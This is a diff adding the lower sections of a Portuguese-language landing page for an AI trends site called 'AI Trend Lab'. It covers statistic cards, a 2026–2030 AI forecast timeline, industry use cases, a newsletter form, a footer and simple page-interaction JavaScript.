+            <div class="tech-card">
+                <div class="tech-number">90<span>%</span></div>
+                <h4>Redução dos Custos de Desenvolvimento de IA</h4>
+                <p>Com a difusão de serviços em nuvem e modelos de código aberto, os custos de desenvolvimento de IA foram reduzidos em mais de 90% nos últimos 5 anos. As barreiras de entrada para PMEs diminuíram significativamente.</p>
+            </div>
+            <div class="tech-card">
+                <div class="tech-number">2<span> seg</span></div>
+                <h4>Velocidade de Inferência em Tempo Real</h4>
+                <p>Graças às mais recentes tecnologias de otimização de inferência, é possível responder a processamentos complexos de IA em menos de 2 segundos. Isso contribui para melhorar a experiência do usuário.</p>
+            </div>
+            <div class="tech-card">
+                <div class="tech-number">150+<span> Funções</span></div>
+                <h4>Integração de Assistentes de IA</h4>
+                <p>A integração de funções de IA nos principais softwares corporativos está se expandindo rapidamente. Mais de 150 funções de IA foram adicionadas, principalmente no Microsoft 365 e no Google Workspace.</p>
+            </div>
+            <div class="tech-card">
+                <div class="tech-number">$0.001<span>/1K token</span></div>
+                <h4>Queda nos Custos de Uso de APIs</h4>
+                <p>O preço de fornecimento de APIs de modelos de IA está caindo rapidamente. Menos de US$ 0,001 por 1.000 tokens tornou-se o padrão, facilitando o uso em larga escala.</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Forecast Section -->
+<section id="forecast">
+    <div class="container">
+        <div class="text-center">
+            <span class="section-label">Previsões Futuras</span>
+            <h2 class="section-title">Roteiro da Evolução da IA<br>2026 - 2030</h2>
+            <p class="section-desc">Com base na análise de especialistas, apresentamos os principais marcos do desenvolvimento da tecnologia de IA no futuro próximo.</p>
+        </div>
+        <div class="forecast-timeline">
+            <div class="timeline-item">
+                <div class="timeline-dot">2026</div>
+                <div class="timeline-content">
+                    <h4>Ano zero dos agentes de IA e período de difusão multimodal</h4>
+                    <p>Agentes de IA autônomos começam a penetrar nas operações de negócios, e a IA multimodal torna-se um recurso padrão em smartphones. Mais de 80% das grandes empresas passam para a fase de formulação e execução da estratégia de IA.</p>
+                </div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-dot">2026</div>
+                <div class="timeline-content">
+                    <h4>Implementação total das regulamentações de IA e aprofundamento da IA industrial</h4>
+                    <p>O AI Act da UE é totalmente implementado, e estruturas regulatórias nacionais de IA são estabelecidas em vários países. A confiabilidade da IA especializada em campos profissionais como diagnóstico médico, direito e finanças melhora drasticamente.</p>
+                </div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-dot">2027</div>
+                <div class="timeline-content">
+                    <h4>Fusão de IA física e robótica</h4>
+                    <p>A tecnologia robótica que conecta a IA e o mundo físico entra na fase de implementação prática. Espera-se que a difusão de robôs autônomos em fábricas, armazéns e canteiros de obras acelere, causando uma revolução de produtividade no setor de manufatura.</p>
+                </div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-dot">2028</div>
+                <div class="timeline-content">
+                    <h4>Aproximação da IA Geral (AGI) e colaboração com a IA quântica</h4>
+                    <p>Surgem sistemas de IA capazes de processar informações em vários domínios, esclarecendo o caminho para a AGI. A colaboração com a computação quântica deve levar a resultados inovadores na descoberta de medicamentos e no desenvolvimento de materiais.</p>
+                </div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-dot">2030</div>
+                <div class="timeline-content">
+                    <h4>Realização de uma sociedade simbiotica com a IA e mercado de US$ 1,8 trilhão</h4>
+                    <p>Uma "sociedade simbiótica com a IA" é realizada, na qual a IA é integrada em todas as indústrias e infraestruturas sociais. Espera-se que o mercado global de IA atinja US$ 1,8 trilhão, com uma contribuição significativa para o crescimento do PIB.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Industry Section -->
+<section id="industry">
+    <div class="container">
+        <div class="text-center">
+            <span class="section-label" style="color:#60a5fa;">Análise por Setor</span>
+            <h2 class="section-title" style="color:white;">Casos de uso de IA em vários setores</h2>
+            <p class="section-desc" style="color:rgba(255,255,255,0.7);margin-left:auto;margin-right:auto;">Resumimos o estado de adoção da IA e o impacto transformador esperado para as principais indústrias.</p>
+        </div>
+        <div class="industry-grid">
+            <div class="industry-card">
+                <div class="industry-icon">🏦</div>
+                <h4>Finanças e Fintech</h4>
+                <p>Detecção de fraudes, pontuação de crédito, negociação algorítmica e consultoria personalizada de gestão de patrimônio.</p>
+            </div>
+            <div class="industry-card">
+                <div class="industry-icon">🏥</div>
+                <h4>Medicina e Saúde</h4>
+                <p>IA para diagnóstico por imagem, aceleração da descoberta de medicamentos, suporte à telemedicina e realização de medicina personalizada para melhorar os resultados dos pacientes.</p>
+            </div>
+            <div class="industry-card">
+                <div class="industry-icon">🏭</div>
+                <h4>Manufatura e Produção</h4>
+                <p>Realização de melhorias significativas de eficiência por meio de manutenção preditiva, automação de inspeções de qualidade, otimização da produção e gestão da cadeia de suprimentos.</p>
+            </div>
+            <div class="industry-card">
+                <div class="industry-icon">🛒</div>
+                <h4>Varejo e E-commerce</h4>
+                <p>Recomendações personalizadas, previsão de demanda, otimização de estoque e suporte 24 horas por dia via chatbots de IA.</p>
+            </div>
+            <div class="industry-card">
+                <div class="industry-icon">🎓</div>
+                <h4>Educação e EdTech</h4>
+                <p>Maximização dos efeitos educacionais por meio de aprendizado personalizado, avaliação automática, tutores de IA e análise do progresso de aprendizagem.</p>
+            </div>
+            <div class="industry-card">
+                <div class="industry-icon">🚗</div>
+                <h4>Automotivo e Mobilidade</h4>
+                <p>Avanço da tecnologia de direção autônoma, otimização do fluxo de tráfego, assistentes de IA a bordo e gerenciamento preditivo de recarga de veículos elétricos.</p>
+            </div>
+            <div class="industry-card">
+                <div class="industry-icon">🌱</div>
+                <h4>Agricultura e Foodtech</h4>
+                <p>Realização de agricultura de precisão por meio de agricultura inteligente, previsão de colheitas, detecção precoce de pragas e doenças e redução do desperdício de alimentos.</p>
+            </div>
+            <div class="industry-card">
+                <div class="industry-icon">🏗️</div>
+                <h4>Construção e Imobiliário</h4>
+                <p>Otimização de design, IA para gestão de processos, previsão de preços imobiliários, gestão de edifícios inteligentes e suporte à gestão de segurança.</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Newsletter Section -->
+<section id="newsletter">
+    <div class="container">
+        <div class="cta-box">
+            <h2>📄 Obtenha o Relatório Gratuito de Tendências de IA</h2>
+            <p>Receba relatórios mensais, as últimas notícias da indústria de IA e insights de especialistas por e-mail. O registro é totalmente gratuito.</p>
+            <form class="cta-form" onsubmit="handleSubmit(event)">
+                <input type="email" id="emailInput" placeholder="Insira seu endereço de e-mail" required>
+                <button type="submit">Registre-se Grátis</button>
+            </form>
+            <div class="success-msg" id="successMsg">
+                ✅ Obrigado por se registrar! Enviamos um e-mail de confirmação.
+            </div>
+            <p class="cta-note">As informações pessoais serão tratadas rigorosamente de acordo com a política de privacidade. Você pode cancelar a inscrição a qualquer momento.</p>
+        </div>
+    </div>
+</section>
+
+<!-- About Section -->
+<section id="about">
+    <div class="container">
+        <div class="about-grid">
+            <div class="about-text">
+                <span class="section-label">Sobre Nós</span>
+                <h2 class="section-title">Sobre o AI Trend Lab</h2>
+                <p>O AI Trend Lab é uma mídia especializada que pesquisa, analisa e divulga as últimas tendências nas áreas de inteligência artificial, aprendizado de máquina e tecnologia. Desde a nossa fundação em 2020, continuamos a fornecer informações confiáveis para gerentes de estratégia de IA corporativa, engenheiros e pesquisadores.</p>
+                <p>Nossa equipe é composta por pesquisadores de IA, cientistas de dados e analistas do setor, fornecendo insights exclusivos de perspectivas práticas e acadêmicas.</p>
+            </div>
+            <div class="about-features">
+                <div class="about-feature">
+                    <div class="about-feature-icon">🔍</div>
+                    <div>
+                        <h5>Pesquisa Independente e Informações Primárias</h5>
+                        <p>Fornecemos análises baseadas em informações primárias obtidas por meio de entrevistas com profissionais do setor e pesquisas independentes.</p>
+                    </div>
+                </div>
+                <div class="about-feature">
+                    <div class="about-feature-icon">📊</div>
+                    <div>
+                        <h5>Análise Baseada em Dados</h5>
+                        <p>Integramos e analisamos várias fontes confiáveis, como estatísticas oficiais, trabalhos acadêmicos e relatórios corporativos.</p>
+                    </div>
+                </div>
+                <div class="about-feature">
+                    <div class="about-feature-icon">🌏</div>
+                    <div>
+                        <h5>Perspectiva Global</h5>
+                        <p>Compreendemos de forma transversal as últimas tendências nos EUA, Europa e Ásia, fornecendo implicações para o mercado local.</p>
+                    </div>
+                </div>
+                <div class="about-feature">
+                    <div class="about-feature-icon">✅</div>
+                    <div>
+                        <h5>Verificação de Fatos Rigorosa</h5>
+                        <p>Todos os artigos e relatórios passam por várias revisões de especialistas para garantir a precisão.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Footer -->
+<footer>
+    <div class="footer-top">
+        <div class="footer-brand">
+            <div class="logo" style="color:white;margin-bottom:14px;">
+                <div class="logo-icon">IA</div>
+                <span class="logo-text" style="color:white;">AI Trend Lab</span>
+            </div>
+            <p>Uma mídia especializada que divulga as últimas tendências em inteligência artificial, aprendizado de máquina e tecnologia. Apoiamos o planejamento de estratégias corporativas de IA.</p>
+        </div>
+        <div class="footer-col">
+            <h6>Conteúdos</h6>
+            <ul>
+                <li><a href="#trends">Últimas Tendências</a></li>
+                <li><a href="#market">Análise de Mercado</a></li>
+                <li><a href="#technology">Tendências Tecnológicas</a></li>
+                <li><a href="#forecast">Previsões Futuras</a></li>
+                <li><a href="#industry">Casos de Uso por Setor</a></li>
+            </ul>
+        </div>
+        <div class="footer-col">
+            <h6>Recursos</h6>
+            <ul>
+                <li><a href="#">Relatórios Gratuitos</a></li>
+                <li><a href="#">White Papers</a></li>
+                <li><a href="#">Webinars</a></li>
+                <li><a href="#">Glossário</a></li>
+                <li><a href="#">Contate-nos</a></li>
+            </ul>
+        </div>
+        <div class="footer-col">
+            <h6>Informações Legais</h6>
+            <ul>
+                <li><a href="#">Política de Privacidade</a></li>
+                <li><a href="#">Termos de Serviço</a></li>
+                <li><a href="#">Aviso Legal</a></li>
+                <li><a href="#">Lei de Transações Comerciais</a></li>
+                <li><a href="#">Configurações de Cookies</a></li>
+            </ul>
+        </div>
+    </div>
+    <div class="footer-bottom">
+        <p>
+            © 2026 AI Trend Lab. Todos os direitos reservados.
+            <a href="#">Política de Privacidade</a>
+            <a href="#">Termos de Serviço</a>
+            <a href="#">Aviso Legal</a>
+            <a href="#">Contate-nos</a>
+        </p>
+        <p style="margin-top:8px;">As informações contidas neste site são fornecidas apenas para fins informativos gerais e não constituem aconselhamento de investimento, jurídico ou profissional.</p>
+    </div>
+</footer>
+
+<!-- Scroll to Top -->
+<button class="scroll-top" id="scrollTop" onclick="window.scrollTo({top:0,behavior:'smooth'})" aria-label="Voltar ao topo">↑</button>
+
+<script>
+    function toggleMobileNav() {
+        const nav = document.getElementById('mobileNav');
+        nav.classList.toggle('open');
+    }
+
+    window.addEventListener('scroll', () => {
+        const btn = document.getElementById('scrollTop');
+        if (window.scrollY > 400) btn.classList.add('visible');
+        else btn.classList.remove('visible');
+    });
+
+    function handleSubmit(e) {
+        e.preventDefault();
+        const input = document.getElementById('emailInput');
+        const msg = document.getElementById('successMsg');
+        if (input.value) {
+            msg.style.display = 'block';
+            input.value = '';
+            setTimeout(() => { msg.style.display = 'none'; }, 5000);
+        }
+    }
+
+    // Animate bars when in view
+    const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+            if (entry.isIntersecting) {
+                entry.target.style.animationPlayState = 'running';
+            }
+        });
+    }, { threshold: 0.2 });
+
+    document.querySelectorAll('.bar-fill').forEach(bar => {
+        bar.style.animationPlayState = 'paused';
+        observer.observe(bar);
+    });
+</script>
+</body>
+</html>
